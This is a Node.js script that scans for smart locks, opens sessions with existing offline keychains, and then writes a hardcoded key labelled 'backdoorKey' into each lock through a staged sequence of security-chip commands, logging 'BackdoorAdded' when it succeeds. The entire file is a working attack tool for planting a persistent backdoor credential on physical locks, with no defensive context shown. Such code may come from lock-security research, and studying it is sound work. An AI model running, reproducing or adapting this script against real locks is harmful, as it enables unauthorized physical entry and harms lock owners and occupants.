const lockScanner = require('./lib/lock_scanner');
const Session = require('./lib/offline_session');
const util = require('util');
const delay = require('./lib/delay');
const cmd = require('./lib/command_builder');
const secEnum = require('./lib/sec/command_enum');
const SecCommand = require('./lib/sec/sec_command');
const environmentConfig = require('../environment.json');
const Environment = require('./lib/environment')
require('./lib/async_logging');

var backdoorKey = 'C8BEEFBACD009ACCE55BACD009ACCE55';
var backdoorKeyId = 0xC8;
// Don't change the mode unless you know exactly what you are doing
var mode = null;

const environment = new Environment(environmentConfig);
function log(channel, data) {
  console.log(channel + ': ' + data.toString('hex'));
}

async function onSecUpdate(session, data) {
  var command = new SecCommand(data.substring(0,32));
  switch(command.commandName) {
    case 'StagedLowerHalfOfOfflineKey':
      await session.secWrite(cmd.stageOfflineKeyPt2(backdoorKey.substring(16,32)).data);
    break;

    case 'StagedUpperHalfOfOfflineKey':
      await session.secWrite(cmd.commitOfflineKey(backdoorKey, backdoorKeyId, mode).data);
    break;

    case 'CommittedOfflineKey':
      console.log('BackdoorAdded');
      await session.disconnect();
    break;
  }
}

async function onSessionStart(lock, session) {
  session.on('secUpdate', async d=>await onSecUpdate(session, d));
  await session.secWrite(cmd.stageOfflineKeyPt1(backdoorKey.substring(0,16)).data);
}

lockScanner.on('lockFound', async lock => {
  console.log('Connected to', lock.id);
  var keychain = environment.createKeychainForLock(lock.id);
  if(!keychain) {
    console.log('No offline keys for lock.');
    return;
  }

  try {
    lock.on('error', d=>log('err', d));
    var session = new Session(lock, keychain);
    session.on('error', d=>log('error', d));
    session.on('secWrite', d=>log('comp->sec', d));
    session.on('mcuWrite', d=>log('comp->mcu', d));
    session.on('secUpdate', d=>log('sec->comp', d));
    session.on('mcuUpdate', d=>log('mcu->comp', d));
    session.on('disconnect', d=>console.log('Disconnected from', lock.id))
    session.once('established', async d=>await onSessionStart(lock, session));
    await session.establish();
  } catch (e) {
    console.log(e);
  }

});

lockScanner.on('error', e => console.log(e));
lockScanner.start();
